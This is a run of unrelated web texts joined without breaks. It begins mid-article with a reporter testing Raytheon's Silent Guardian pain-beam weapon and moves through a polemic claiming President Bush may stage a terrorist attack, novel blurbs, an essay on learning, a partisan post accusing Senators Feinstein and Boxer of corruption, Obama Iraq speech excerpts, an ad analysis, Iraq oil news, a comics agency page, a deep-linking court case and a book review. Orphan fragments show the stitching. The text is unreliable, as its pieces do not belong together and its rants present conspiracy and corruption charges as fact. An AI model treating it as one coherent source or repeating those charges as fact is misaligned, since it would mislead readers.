And , to be fair , the machine is not designed to vaporise , shred , atomise , dismember or otherwise cause permanent harm .
Scroll down for more ...
But it is a horrible device nonetheless , and you are forced to wonder what the world has come to when human ingenuity is pressed into service to make a thing like this .
Silent Guardian is making waves in defence circles .
Built by the U.S. firm Raytheon , it is part of its " Directed Energy Solutions " programme .
What it amounts to is a way of making people run away , very fast , without killing or even permanently harming them .
That is what the company says , anyway .
The reality may turn out to be more horrific .
I tested a table - top demonstration model , but here 's how it works in the field .
A square transmitter as big as a plasma TV screen is mounted on the back of a Jeep .
When turned on , it emits an invisible , focused beam of radiation - similar to the microwaves in a domestic cooker - that are tuned to a precise frequency to stimulate human nerve endings .
It can throw a wave of agony nearly half a mile .
Because the beam penetrates skin only to a depth of 1/64th of an inch , it cannot , says Raytheon , cause visible , permanent injury .
But anyone in the beam 's path will feel , over their entire body , the agonising sensation I 've just felt on my fingertip .
The prospect does n't bear thinking about .
" I have been in front of the full - sized system and , believe me , you just run .
You do n't have time to think about it - you just run , " says George Svitak , a Raytheon executive .
Silent Guardian is supposed to be the 21st century equivalent of tear gas or water cannon - a way of getting crowds to disperse quickly and with minimum harm .
Its potential is obvious .
" In Iraq , there was a situation when combatants had taken media as human shields .
The battalion commander told me there was no way of separating combatants from non-combatants without lethal force , " Mr Svitak tells me .
He says this weapon would have made it possible because everyone , friend or foe , would have run from it .
In tests , even the most hardened Marines flee after a few seconds of exposure .
It just is n't possible to tough it out .
This machine has the ability to inflict limitless , unbearable pain .
What makes it OK , says Raytheon , is that the pain stops as soon as you are out of the beam or the machine is turned off .
But my right finger was tingling hours later - was that psychosomatic ?
So what is the problem ?
All right , it hurts , but then so do tear gas and water cannon and they have been used by the world 's police and military for decades .
Am I being squeamish ?
One thing is certain : not just the Silent Guardian , but weapons such as the Taser , the electric stun - gun , are being rolled out by Britain 's police forces as the new way of controlling people by using pain .
And , as the Raytheon chaps all insist , you always have the option to get out of the way ( just as you have the option to comply with the police officer 's demands and not get Tasered ) .
But there is a problem : mission creep .
This is the Americanism which describes what happens when , over time , powers or techniques are used to ends not stated or even imagined when they were devised .
With the Taser , the rules in place in Britain say it must be used only as an alternative to the gun .
But what happens in ten or 20 years if a new government chooses to amend these rules ?
It is so easy to see the Taser being used routinely to control dissent and pacify - as , indeed , already happens in the U.S .
And the Silent Guardian ?
Raytheon 's Mac Jeffery says it is being looked at only by the " North American military and its allies " and is not being sold to countries with questionable human rights records .
An MoD spokesman said Britain is not planning to buy this weapon .
In fact , it is easy to see the raygun being used not as an alternative to lethal force ( when I can see that it is quite justified ) , but as an extra weapon in the battle against dissent .
Because it is , in essence , a simple machine , it is easy to see similar devices being pressed into service in places with extremely dubious reputations .
There are more questions : in tests , volunteers have been asked to remove spectacles and contact lenses before being microwaved .
Does this imply these rays are not as harmless as Raytheon insists ?
What happens when someone with a weak heart is zapped ?
And , perhaps most worryingly , what if deployment of Silent Guardian causes mass panic , leaving some people unable to flee in the melee ?
Will they just be stuck there roasting ?
Raytheon insists the system is set up to limit exposure , but presumably these safeguards can be over - ridden .
Silent Guardian and the Taser are just the first in a new wave of " non-lethal " weaponry being developed , mostly in the U.S .
These include not only microwave ray - guns , but the terrifying Pulsed Energy Projectile weapon .
This uses a powerful laser which , when it hits someone up to 11/ 2 miles away , produces a " plasma " - a bubble of superhot gas - on the skin .
A report in New Scientist claimed the focus of research was to heighten the pain caused by this semi-classified weapon .
And a document released under the U.S. Freedom of Information
Act talks of " optimal pulse parameters to evoke peak nociceptor activation " - i.e. cause the maximum agony possible , leaving no permanent damage .
Perhaps the most alarming prospect is that such machines would make efficient torture instruments .
They are quick , clean , cheap , easy to use and , most importantly , leave no marks .
What would happen if they fell into the hands of unscrupulous nations where torture is not unknown ?
The agony the Raytheon gun inflicts is probably equal to anything in a torture chamber - these waves are tuned to a frequency exactly designed to stimulate the pain nerves .
I could n't hold my finger next to the device for more than a fraction of a second .
I could make the pain stop , but what if my finger had been strapped to the machine ?
Dr John Wood , a biologist at UCL and an expert in the way the brain perceives pain , is horrified by the new pain weapons .
" They are so obviously useful as torture instruments , " he says .
" It is ethically dubious to say they are useful for crowd control when they will obviously be used by unscrupulous people for torture . "
We use the word " medieval " as shorthand for brutality .
The truth is that new technology makes racks look benign .

When will the American homeland suffer the next big spectacular " Islamo - Fascist " ( we ’re going to hear that phrase a lot in the next two months ) terrorist attack ?
Another terrorist assault on our homeland is inevitable :
We know this is true because we have been told so by President George W. Bush and Vice President Richard Cheney .
And they ought to know .
Their foreign policy has enraged the entire Middle East thus turning against America as many as 1.8 billion Muslims .
Much of the world considers the USA the biggest threat to world security .
They would feel a whole lot safer and " Xanax " sales would plummet if the entire population of the U.S. of A. were sent to colonize Pluto .
What can we do to prevent a second 9/11 ?
Some will tell you that America should withdraw its forces from Afghanistan and Iraq and that US foreign policy should be separated from that of the state of Israel .
The Bush Administration has other plans : Americans will be asked to endorse perpetual war and to hand over total power to the President .
If we do n’t , the terrorists will attack for sure .
If is not even part of the equation … so we are led to believe .
Bush ca n’t milk fear of another attack forever …
Or can he ?
If the Islamo - Fascists do n’t come to Bush ’s rescue , he may have to light the fuse himself .
This seems to be his intent .
I ’m sorry ; a bunch of British Muslims with hydrogen peroxide and a few iPods does n’t cut it .
Most of us have both of these items tucked away in our homes .
Does that make us dangerous ?
In the eyes of the Bush Administration , someday all too soon , it will .
I may buy the idea that America is on the brink of annihilation because the policies of Karl Rove ’s blue - eyed boy have brought us to the edge of World War III .
But no one can sell me the notion that a dictatorship and perpetual war will prevent the Armageddon .
Indeed , that can only guarantee it .
Are we to invade every country that does n’t toe the White House line ?
Surely threatening other countries with invasion would swell the ranks of those who want Yankee to go home .
Are we to incarcerate and torture everyone who harbors ill will towards the U.S. ?
That would make Stalin ’s gulag seem like the Wayne , N.J. City jail .
The Islamo - Fascists got exactly what they wanted : a Sunni-Shiite civil war , with the U.S. stuck in the middle .
Mayhem fueled by murderous tribes and by billions of borrowed greenbacks .
Eventually we ’ll go bankrupt and have to vacate the Middle East with our tails between our legs .
That ’s Osama ’s idea .
The Islamo - Fascists really do n’t need to waste time on another 9/11 .
When is our spineless Congress going to hand over total power to President Bush ?
Or have they already done it ?
When is an American version of Hitler ’s Enabling Act going to be passed ?
Or has Bush just " decided " it already has ?
He ’s already had his Reichstag Fire .
When will elections have any meaning in America again ?
They wo n’t as long as electronic voting machines lacking a paper trail are used .
When will the Bush Administration actually turn over the reins of power to the next president ?
2008 ?
Doubtful .
I do n’t see them abandoning their agenda of Empire so easily .
The Constitution is meaningless to them .
Besides , once out of office , they may be wanted men .
When will our constitutional system of checks and balances be restored ?
Never as long as George W. Bush and the Neocons rule .
When will The United States of America become a Republic again where the rule of law applies to all citizens ?
Never , unless Caesar is stripped of his laurels .
When will Americans of differing political stripe cease to hate and begin to debate ?
When will persuasion be preferred to coercion ?
Never as long as George W. Bush and the Neocons rule .
When will the draft be re-instated ?
As soon as George W. Bush runs out of " voluntary " cannon fodder .
When will The Great Wall of America , designed to keep out illegal aliens , be completed ?
As soon as possible before the draft is re-instated .
George W. Bush and the Neocons will need The Wall to keep us in .
When will America abide by the Geneva Conventions and cease to torture ?
Never as long as George W. Bush and the Neocons rule .
When will secret wiretaps of American citizens stop ?
Never as long as George W. Bush and the Neocons rule
When will Iran stop uranium enrichment ?
Never .
Like it or not , it ’s their right under the Nuclear Non-Proliferation Treaty .
When will Israel sign the Nuclear Non-Proliferation Treaty ?
Never .
When will George W. Bush drop the bomb ?
As soon as he can " decide " which country gets it first — Iran , Syria or North Korea — and as soon as he can convince Israel to do it for him .
When will " The War on Terror " end ?
Never as long as George W. Bush and the Neocons rule .
When will America be an admired and respected nation again ?
Never as long as George W. Bush and the Neocons rule .
When will Americans be " safe " again ?
Never as long as George W. Bush and the Neocons rule .
When will the lives of American citizens no longer belong to the owners of the Government ?
Never as long as American citizens allow George W. Bush and the Neocons to own them .
When will George W. Bush stop lying ?
Never .

" Whitlock is an assured writer with a patient comic touch . " – The National Post
“ His characters propel the action , calling attention to narrative style only with metaphor and image – which are always arresting , always right ... an absorbing read . ” – The Globe and Mail
" Whitlock 's second novel slyly masks immense depth of character and emotion behind wry humor and a simple story about seemingly uncomplicated people . . .
Whitlock shows that characters do n't need to be flashy to be interesting , just written well . " — Publishers Weekly ( US )
" You might call Nathan Whitlock ’s sense of humour the gallows kind : he readily locates the brutal and exposes its ridiculous underside .
Not that he makes fun of his characters ’ small , damaged lives — too much , anyway .
Instead , he opens them up to reveal their working — and broken — parts . ” — The Winnipeg Review
“ Congratulations on Everything is a wonderfully complicated story about small but big ambitions , full of surprising , bittersweet twists .
Expect some great laughs .
Do yourself a favour :
Get this book ! ” — Jowita Bydlowska , author of Drunk Mom : A Memoir
“ Whitlock ’s fast and funny novel explores lives that may look small from the outside but are vast and infinitely redeemable . ” — Katrina Onstad , author of Everybody Has Everything
“ Possibly the most entertaining book ever written about a decent guy committing self - sabotage .
Reminds me of Russell Banks at his best . ” — Cary Fagan , author of Bird ’s Eye and My Life Among the Apes
“ A funny , sad guided tour of the private hell that is owning a bar or restaurant .
The best novel I ’ve read all year . ” — Corey Mintz , author of How to Host a Dinner Party
One of my most eye - opening early experiences was a tour of a local manufacturing plant during high school .
One of our tour guides was a MIT trained engineer who accompanied us , explaining how everything worked .
At the end of the tour , he gave each of us a picture of a spider he had taken under one of the electron microscopes they had at the facility .
He labelled it " Boris the Spider " after the Who song .
I kept that photo in my school locker for months .
As a college - bound high school junior , I was impressed .
I thought my Apple II was the neatest tool ever , but this guy had a freaking electron microscope .
He was articulate , intelligent , and on top of that , one of the coolest people I had ever met .
And he graduated from MIT , one of the best engineering schools in the country .
During lunch , I asked him how much of his schoolwork applied to his current engineering job .
His response ?
I can't think of a single thing from my MIT classes I 've used on the job .
This blew my mind .
What 's the value of a marquee college degree if none of the skills you learn are useful on the job ?
At first , I was incredulous .
But after considering my own high school educational experience , it started to make more sense .
And certainly after attending college for a year , I knew exactly what he meant .
The value of education is n't in the specific material you learn -- it 's in learning how to learn .
In Knowledge Access as a Public Good , danah boyd presents Wikipedia as a perfect example of the latter :
Why are we telling our students not to use Wikipedia rather than educating them about how Wikipedia works ?
Sitting in front of us is an ideal opportunity to talk about how knowledge is produced , how information is disseminated , how ideas are shared .
Imagine if we taught the " history " feature so that students would have the ability to track how a Wikipedia entry is produced and assess for themselves what the authority of the author is .
You can't do this with an encyclopedia .
Imagine if we taught students how to fact check claims in Wikipedia and , better yet , to add valuable sources to a Wikipedia entry so that their work becomes part of the public good .
Passively reading the material in an encyclopedia or textbook is learning , in a sense .
But learning how to research and question the material you read -- and , as in Wikipedia , how to update it so you 're adding to the communal wealth of knowledge -- is a far more valuable skill .
This kind of participatory , hands - on experience outstrips any kind of traditional classroom textbook .
Why read textbooks when you can help write one ?
There 's no substitute for learning on the battlefield .
Nowhere is the importance of learning how to learn more critical than in the field of software development .
Programming is , almost by definition , continuously learning : your entire career will be one long , unbroken string of learning one new bit of technology after another .
Every ten years the software development field reinvents itself , and it 's our job to keep up .
If you do n't like learning new things , you will despise software engineering .
It 's all we do .
That 's why learning how to learn is such an important skill for software engineers .
In our field , how only lasts about five years , but why is forever .
Feinstein screws vets for benefit of rich hollywoood elites
by American Elephant
Dianne Feinstein is at it again .
Last month we told you how she had steered millions and millions of dollars in military contracts to companies that her husband profits from directly .
Now the Wall Street Journal exposes a $ 4 BILLION handout she gives to her rich contributors in wealthy West LA at the expense of Americas injured veterans :
Ms. Feinstein , who in the last election received some of her largest donations from the rich area , has been only too happy to come to its defense .
She honed in on the military construction and veterans affairs bill–a sensitive spending vehicle that few Republicans would dare vote against , and that President Bush would be loath to veto .
She then slipped in an earmark provision that would bar the VA from disposing or leasing any of the ground .
Thus a potential $ 4 billion worth of help and aid for our nation ’s veterans goes bye - bye in the name of preserving a view for those Hollywood actors who play veterans in the movies .
[ read the whole thing ]
So much for Democrat ’s claims to care about our veterans .
And when Republicans tried to strip this egregious earmark from the bill , Feinstein ’s comrade in corruption , Barbara Boxer , jumped to her feet in indignation and threatened that anyone who voted against Feisntein ’s multi-billion giveaway to her rich hollywood liberal supporters , would have their projects and earmarks killed .
Republicans may have had a few corrupt members , but you ’ll notice they ’re all gone now .
We get rid of corruption when we discover it — Democrats , on the other hand , keep them , re-elect them and promote them .
( And their corrupt counterparts in the news media naturally cover for them . )
Barbara
Boxer for example was one of the most egregious offenders in the congressional banking scandal , yet here she is threatening anyone who tries to stop her and Feinstein from giving a $ 4 billion handout to their rich Hollywood supporters at the expense of injured veterans .
In addition to her latest heinous earmark , Feinstein was discovered to have been profitting from defense contracts — yet Democrats wo n’t even think about investigating her .
No , mark my words , the very same corrupt crew of Democrats that were stripped of power in 1992 are still there , they ’ve been promoted since , and they ’ve been waiting 15 very long years to get their corrupt clutches back on the reins of power .
Now that they have it , they are doing everything in their power to make certain they never lose it again ( undermining the war , the fairness doctrine , amnesty , etc ) , and I ’d be willing to bet good money that they ’re already up to their eyeballs in corruption that will make anything Republicans did look like child ’s play .

Sen. Barack Obama ( D - IL ) will call for the withdrawal of all US troops from Iraq in Iowa today .
Excerpts follow .
“ Let me be clear :
There is no military solution in Iraq and there never was , ” he will say , according to advance remarks from the speech .
“ The best way to protect our security and to pressure Iraq ’s leaders to resolve their civil war is to immediately begin to remove our combat troops .
Not in six months or one year – now . ”
Notes AP : “ Obama ’s ardent opposition to the war has been a central theme of his campaign for the Democratic presidential nomination , and he has used it to distinguish himself from leading rival Sen.
Hillary Rodham Clinton , D - N.Y .
She voted to authorize the use of force in Iraq ; Obama was not yet a senator . ”
“ We must get out strategically and carefully , removing troops from secure areas first and keeping troops in more volatile areas until later , ” Obama will add .
“ But our drawdown should proceed at a steady pace of one or two brigades each month , ” he says .
“ If we start now , all of our combat brigades should be out of Iraq by the end of next year . ”
“ The president would have us believe there are two choices : keep all of our troops in Iraq or abandon these Iraqis , ” he continues .
“ I reject this choice . ”
Obama is being introduced by President Carter ’s onetime National Security Adviser Zbigniew Brzezinski , likely in an attempt to bolster his credentials on the question of experience , which has dogged him throughout his campaign with Sen. Hillary Clinto ( D - NY ) .
In the speech , according to AP , he argues for “ creating an international working group of countries in the region and in Asia and Europe that would work to stabilize Iraq . ”

He added that he had a groin problem and even another hamstring niggle throughout the Ashes series .
This outdoor ad , newly posted on a phone kiosk , arrested me as I strolled down Lexington Avenue last night .
Its explicit content can be summarized as follows :
A young woman , facing the viewer , holds what appears to be a prosthetic arm — her own prosthetic arm , one infers .
The young woman is casually dressed in a sweater and jeans .
Her expression borders on neutral .
Where her right arm should be , the sweater has been pinned back .
The poster also contains words advertising a new HBO documentary , executive - produced by James Gandolfini , concerning the difficulties faced by a new generation of American war veterans returning home from Iraq .
That is a pictorial inventory , but the poster contains more content than I have listed .
Most of that content is externally located .
For this poster has been framed and shot , and its subject styled and posed , almost exactly like an American Gap ad .
Consciously or unconsciously , an American viewer will almost certainly make an uncomfortable connection between the disfigurement and sacrifice portrayed in this ad , and the upbeat quality of the Gap ’s long - running , highly successful clothing slash lifestyle campaign .
That connection is content .
And the non-verbal information that triggers that content in the viewer ’s mind is art direction .
Wordless and full of meaning
What is the art direction saying ?
What is it adding to the content that is already there ?
Surely the sight of an attractive young woman who has lost her arm fighting in Iraq is loaded enough as an image .
Surely a non-combatant , far from Iraq , safe at home , already feels plenty of complex emotions when confronted with this one veteran and at least some of the visual evidence of her sacrifice .
What additional statement is being made by the art director ’s decision to style this poster like a Gap ad ?
Here is a possible reading :
While many Americans are well aware that their country is at war , many others are doing their best to blot that thought out of their minds .
In this effort at collective amnesia they are abetted by many retail advertisers and TV programmers , including not a few TV news programmers .
Ratings - wise , the war is a bummer .
Sales - wise , it is a drag .
America wants to shop and move on .
( Interestingly , the fashion industry is the one segment of America ’s consumer culture that is paying attention .
The 691 pages of the new September Vogue are filled with skirts , shoes , dresses , and jackets that obviously resemble armor or in other ways clearly invoke awareness of war and warriors . )
In conceiving the way this poster would be shot and styled , the art director was not holding the Gap responsible for the war in Iraq .
Nor was he or she blaming the viewer .
But by carefully echoing the imagery of an ad that epitomizes our comfortably shallow consumer lifestyle , the art director does indict the complacent among us and challenge us to think about something besides our next new sweater or iPod .
The placement of type ensures that the words are the last thing we see on the poster .
We absorb and are discomfited by the rich , non-verbal text for several beats before our eyes take in the explicit , written content announcing a documentary .
That is art direction .
It is not art .
It is not design .
It is something else .
It makes us feel .
It makes us think .
It holds up the mirror to our desires , our regrets , ourselves .

Iraq has known oil reserves of 116 billion barrels
Iraq is sitting on potential reserves of 100 billion barrels , nearly twice as much as currently estimated , according to a study by energy analysts IHS .
If these reserves were exploited , it said , Iraq could overtake Saudi Arabia as the world 's top oil producer .
But a major improvement in security and investment was needed , it added .
' Golden opportunity '
The IHS survey , which examined Iraq 's oil reserves both before and after the overthrow of Saddam Hussein , is the most comprehensive conducted since the 2003 invasion .
It found that Iraq had known reserves of 116 billion barrels and could be sitting on a further 100 billion barrels .
Iraq 's reserves are clearly phenomenal
Ron Mobed , IHS
Current output of two million barrels a day is lower than in early 2003 , when three million barrels were being pumped , and almost half that being produced in 1979 .
However , it said Iraq had the capacity to increase production to four million barrels by 2012 and to further increase that to six million within time .
" Iraq 's reserves are clearly phenomenal , " said Ron Mobed , president and chief operating officer of IHS , adding that they represented a " gold star opportunity " .
But he stressed that the security situation needed to improve dramatically if the foreign investment needed to improve the country 's infrastructure was to materialise .
" Obviously the security situation is very bad .
But once the infrastructure is in place , the oil will come out of the ground quite cheaply . "
Below capacity
The report found that Iraq 's two main oilfields , at Kirkuk in the north of the country and Rumaila in the south , were operating below capacity .
This was partly due to damage caused by the war and previous sanction regimes although Mr Mobed said this was not " irreparable " .
Earlier this year , the Iraqi government agreed a draft law for how its oil wealth would be shared among different ethnic groups , seen as crucial to encouraging new investment .
The proposed law is due to be considered by the Iraqi parliament shortly , although the Kurdish region rejects some of the proposals .

Comics with a soul
Our motto here at the Blank Label Comics creative agency is that comics should before all else have a soul , something that people can relate to .
Over the years the comic book scene has become crowded with lots and lots of content that has been produced for the sake of racking up number of published comics .
Blank Label Comics team tries to put quality before quantity .
With each new comic that gets released by us we make sure that it speaks volumes .
Instead of focusing on the bottom line entirely , we try to provide substance .
And who are we to be making such bold claims ?
Well , we ’re a small team of comic book creators and comic book fans , with a voracious appetite for comic books , comic book history , comic book conventions , and comic book publication .
My friend and colleague Jake just said that I should also point out that we do have other interests .
It ’s the usual geeky stuff like electric skateboards , video games , movies and TV shows , flying RC drones with FPV goggles , etc .
We do have lives outside of the world of comic books .
Do n’t believe the stereotypes of nerds cooked up in the basement , with their comic book collections .
Truth be told , we are a relatively young comic book team , with only around 7 years of experience under our belt .
We have n’t seen that big of an audience for short series of comics books that we have released .
In a sense , we talk a big game , but we ourselves have our work cut out for us and wo n’t be making it big anytime soon .
Still , we keep fighting the fight and we are always creating new interesting content .
We try to be original and also to make sure that our comics are fun , but at the same time educations and serve a purpose in the community .
Shaping the future with comics
What we mean when we say public service comics probably is n’t what you ’re picturing in your mind right now .
It ’s not Bob , the fire safety dog , or Wilson the stranger danger cat .
Not that there ’s anything wrong with that though .
Making comics like that is more than a worthy cause .
No , what we ’re focusing on are comics that try to get the kids out of their house and away from the screen .
Comics that will spark up their curiosity and sense of adventure to get out there in the world .
I think that we can all agree kids are becoming more and more complacent nowadays .
They have their noses pointed at computer screens , TVs , smartphones , social media , what have you , without ever developing the inquisitiveness that is needed to learn , study and grow as a person .
Having a hobby is important , and it ’s what makes life worth living , no matter what it might be .
We already mentioned what makes us get out on fresh air here at Blank Label Comics .
Going out in the park with our remote controlled drones for children , or el skateboards and fooling around with the guys .
Tech gadgets like drones , electric skateboards , electric bicycles , and others , are a great way how to get out of the house , while at the same fiddling around with tech .
Note : some states require you to have a drone flying license , for more info please refer to FAA Part 107 Study Guide .
So that ’s what our comics are based around of .
Each comic that get published by us will incorporate a twist or a character that knows his way around the great outdoors .
It could be a cool trick that can be done in the forest , a lesson on how to easily build a tent , fun games that can be played outside , etc .
Learning through comic books is easier for the kids , because kids tend to imitate their heroes .
We shape the heroes in our comics to have adventures in the outdoors , and all the qualities that we ’ve previously mentioned .
Our projects and comic book reviews
So far we ’re still preparing our comic books for publication on this website .
We have contracted a programmer to make a special interface to suit the needs of a comic book , an online comic book reader so to speak .
You can see similar ones on other more reputable websites .
We are trying to do things the right from the start .
There are 4 core members here at Blank Label Comics , and we hire additional help from people around the world , graphics artists , editors and other similar skill sets , on an as - needed - basis .
Everything we ’ve said still stands , we strive to make our comics unique , educational , and with focus on quality over quantity .
Soon we will start publishing , so stay tuned .
In the mean time we will be adding content , articles on news from the comic book world , new comics , things like that .
This is just so that we give something to our visitors until comics go live .
We ’re going to be covering comic books that we read , writing reviews , making recommendations for people who might not be that prone to reading comic books , but would like to begin in the future .
A lot of people that I ’ve met told me that they would like to read comics , mostly after watching movies based off of Marvel and DC Comics , but that they do n’t know where to start .
It can be quite intimidating , but we ’ve got you covered .
There ’ll be a whole series of posts that talk about where to start reading , which comic book .
Some of the more mainstream ones are published for couple of decades now .
It ’s no surprise that people do n’t know where to start .
Blank Label Comics team

that would be me , the guys who ’s ramblings you ’ve been reading up until now .
I ’m the head honcho for the website .
Everything that gets posted goes through me .
I ’m also the head content writer for the website for the time being , until comics from the rest of the guys start being published .
When I ’m not working on the website , I ’m usually at home , cooking , or out on a walk with my dog , Sam .
Jake Montgomery
Creative director
hi there , I ’m Jake and I ’m the head creative director of Blank Label Comics .
I ’ve been with the team since the beginning , 7 years now , my God , how the time flies .
I ’ve been working on our comic book series as a role development specialist .
I ’m the guy who works on characters , their history , beliefs , etc .
At home you can usually find me playing video games or I ’m at the park , playing with gadgets .
Barbara Stockwell
Graphics director
my name is Barb and I ’m the head graphics designer here at Blank Label Comics .
I ’m working with the team for the past couple of years , drawing characters , scenes , but I ’m mostly coordinating work between the various outsourced graphics artists that we use .
There is a lot of work , drawing comic books , so we have to work with outside graphics designers most of the time .
My hobbies include astronomy , walking my dog Betty and sleeping in on a rainy afternoon .
Caldir Shaddo
Content director
hi , I ’m Caldir , but my friends call me Cal. my role here at Blank Label Comics is that of a content director .
I ’m working at Blank Label comics for about 4 years now .
I was brought in to coordinate the content team , which works on producing comic book content .
It ’s not an easy job but I love it .
I ’m always thinking up of new ways how to motivate the young to learn , be more inquisitive and to expand their minds with our characters .
What more could you ask .
When I ’m at home I like to read a book , or watch TV with my kids .
Recent Comic Book Design Work
A reader writes :
I can't bear to watch them anymore , but this has nothing at all to do with either gent , or their humor they 're both incredibly talented , and their shows are consistently excellent .
But in the end , I think they 've become part of the problem , and not part of the solution .
The problem lies in the role they play in the overall mediasphere , especially among Gen X and Gen Y ; namely , the fact that for many of these viewers , Stewart / Colbert have become a surrogate for actually engaging with politics and current events more deeply , or treating it all as anything other than an ongoing joke .
I know this makes me sound like a fuddy - duddy -- I 'm only 40 -- but still ...
I can't tell you how many people I know who get their political news exclusively from Stewart / Colbert , and that 's pathetic .
How is this for low : Elite computer scientists are using highly addictive computer games to trick unsuspecting Web users -- possibly including children -- into toiling without pay for some of the world 's richest companies on stupefyingly dull grunt work .
It 's all true .
Though , in fairness , nothing nefarious is going on at all .
The scientists ...
A court in Dallas , Texas has found a website operator liable for copyright infringement because his site linked to an ' audio webcast ' without permission .
Observers have criticised the judge for failing to understand the internet .
Robert Davis runs Supercrosslive.com and put direct links on his site to audio streams of motorcycle racing .
Those streams were created , owned and hosted by SFX Motor Sports , which is behind some of the events covered .
A preliminary injunction was granted on 12th December by Judge Sam Lindsay in the US District Court for the Northern District of Texas .
Judge Lindsay followed that ruling with a summary judgment for SFX on 9th January , leaving only damages to be determined at trial , on the same day that Davis filed an appeal against the December ruling .
Judge Lindsay ruled that Davis 's activity infringed copyright and curtailed the ability of SFX to sell advertising and sponsorship on its site .
That advertising is displayed when the audio streams are listened to from the SFX site but not when they are linked to from Davis's .
In fact the December opinion was unclear on the exact nature of Davis 's activity .
SFX asserted that " Davis ' streams ' the live webcast of the races on his website in ' real time ' " .
Davis denied streaming but admitted to " providing an audio webcast ' link ' to the racing events on his website " .
Judge Lindsay appears to accept that Davis is only linking to a media file , not streaming content from his own site .
" The live broadcasts of the racing events , either via television , radio or internet webcasts , constitute original audiovisual material that can be copyrighted under the Copyright Act , " wrote Lindsay in his December opinion .
" The court finds that SFX has shown a substantial likelihood of succeeding on the merits of its copyright claim against Davis because SFX has shown ownership of the material and ' copying ' by Davis . "
Davis argued that he did not actually copy any material , he only provided a link to it which opened the material in a user 's media player , but the court ruled that that link broke the law .
" The court finds that the unauthorized ' link ' to the live webcasts that Davis provides on his website would likely qualify as a copied display or performance of SFX ’s copyrightable material , " said Lindsay .
" The court also finds that the link Davis provides on his website is not a ' fair use ' of copyright material as Davis asserts through his Answer . "
Judge Lindsay did not look to other cases on deep linking , being hyperlinks that target something other than a website 's homepage .
Instead , he looked at cases on live television broadcasts .
He compared Davis 's actions to those of a company sued by the NFL for the unauthorised capture and satellite transmission of live football broadcasts to viewers in Canada .
Finding infringement , that court said a public performance or display , for the purposes of the Copyright Act , " includes each step in the process by which a protected work wends its way to its audience . "
The opinion and summary judgment prompted one blogger , James Robertson , to accuse Judge Lindsay of having " no idea how the internet works " .
Davis was representing himself in his case , without the assistance of a lawyer .
Perhaps guided by comments from various bloggers ( including William Patry , Senior Copyright Counsel at Google , who called it " a deeply disturbing case " ) , Davis 's appeal argues that since the December ruling he has " become familiar with " a 2000 decision on deep linking .
" Had this court been aware of this prior decision , Defendant believes this court may have produced a different ruling , " wrote Davis in his latest motion of 12th January , which asks the court to stay the order of 11th December pending his appeal ( though it makes no reference to the Summary Judgment handed down three days earlier ) .
The case to which he refers is the dispute between Ticketmaster Corp. and Tickets.com .
Tickets.com , a seller of tickets , was sued for linking to pages on Ticketmaster 's website where users could find tickets not available at Tickets.com .
The US District Court for the Central District of California concluded : " hypertext linking [ without framing ] does not itself involve a violation of the Copyright Act … since no copying is involved . "
That court went on to describe the process of hypertext linking : " The customer is automatically transferred to the particular genuine web page of the original author .
There is no deception in what is happening .
This is analogous to using a library 's card index to get reference to particular items , albeit faster and more efficiently . "
However , if an appeal is heard , unless Davis 's site made clear that the target file was being served by another website , SFX may be able to distinguish its circumstances from those of Ticketmaster .
Davis 's site has become a repository for court documents and links to coverage of the case .

A while ago I included a review of a couple of John Brunner books ( " Stand on Zanzibar " and " The Sheep Look Up " ) that aligned closely with some of the issues that the peak oil world tends to obsess about ( primarily population growth and environmental degradation for those books ) .
During my February reading break I found myself re-reading his other classic work " The Shockwave Rider " as a way of further procrastinating the reading of various ( unread ) heavyweight tomes I have sullenly eyeing me from the bookshelves .
This book took a lot of Alvin Toffler 's ideas from " Future Shock " and extrapolated them forward a few decades , most famously predicting the arrival of both the internet and parasites that infest it such as computer virus ' and worms .
While the book is probably only known today in hardcore geek circles , it also covered a range of other interesting ideas , such as :
- " ecofast " ( energy efficient / sustainable ) housing
- the destruction of an american city by a natural disaster and the inhabitants being left to fend for themselves by the government in " paid avoidance zones "
- a post oil world - public and electric transport rather than fossil fueled cars
- " the plug in lifestyle " - a highly mobile population ( at least amongst the professional classes ) that frequently moves houses and jobs
- alienation leading to widespread use of tranquillizers and other mood altering drugs
- the value of slowing down in order to make more progress
- the emergence of complete information transparency ( for government and some corporate data )
- the breakdown of societal cohesiveness and the division of society into tribes
- the replacement of the " arms race " with the " brain race "
- the value of wisdom vs the combination of knowledge and greed
- delphi pools - using the " wisdom of crowds " by allowing the population to bet on a large range of important issues and the government then adjusting policy based on the results ( well sometimes - the other tactic is to rig the market to adjust public perceptions )
- corporations which are favoured by the government ( particularly in terms of access to information ) based on their contribution to " national advantage "
- widespread paranoia caused by people knowing that others have access to more information than they do
- government being taken over by organised crime
I 'll quote a few other reviews of the book from around the net and then launch into a rather long winded survey of recent news relevant to some of the ideas Brunner explored as well as indulging in some 1980 's cyberpunk and cypherpunk era nostalgia ( while science fiction is n't meant to be predictive of the future , its interesting to see just how well the book did as futurism rather than an extrapolation of existing trends ) .
" What the hell does this have to do with energy and the environment ? " some of you ( those who are n't resigned to my not infrequent diversions from the topic at hand ) might be asking ?
As I 'm prone to rant from time to time , peak oil , global warming , resource wars and my other topics of interest are all be -devilled by the problem of data quality .
Oil data is incomplete , frequently held secret and manipulated at every level , which is why I do n't bother with the day to day haggling over when the peak date is .
Our resource wars over oil are clouded with endless disinformation and propaganda campaigns , some that have been going on for decades .
Global warming science is also afflicted , with the best source of much of the information ( various US government funded institutions ) suffering from censorship and political interference , exacerbated by the fossil fuel industry 's FUD campaign against the scientists .
So Brunner 's musings on the concept of freedom of information and related topics seem relevant to me - but if you just want energy news , the time to stop reading is now - come back again tomorrow .
I will mention energy and global warming a few times along the way though .
First up , from Mac Tonnies " Utopian / Dystopian book reviews " :
John Brunner 's " The Shockwave Rider , " published in 1976 , is a fast - forward glimpse of a 21st century that -- unlike the vast majority of SF written in that distant era -- predicts some of our worst fears and reasons for hope .
" The Shockwave Rider " is perhaps best known for its eerily prescient rendering of a government - controlled Internet alive with " tapeworms " : Brunner 's equivalent to computer viruses .
With its mechanized ambience and hacker protaganist , " The Shockwave Rider " is one of the principal " protocyberpunk " novels , predating Bruce Sterling 's " Islands in the Net " by a decade .
But computers are merely the surface of this book .
Beneath the veneer of techno and inventive slang is a challenging utopian discourse as engaging as B.F. Skinner 's " Walden Two . "
Like " The Sheep Look Up , " " The Shockwave Rider " deals unflinchingly with where we 're headed as a species -- and how to know when to apply the temporal brakes .
Directly inspired by Alvin Toffler 's classic " Future Shock , " Brunner 's novel is a serious -- but spirited -- examination of transcience on daily life .
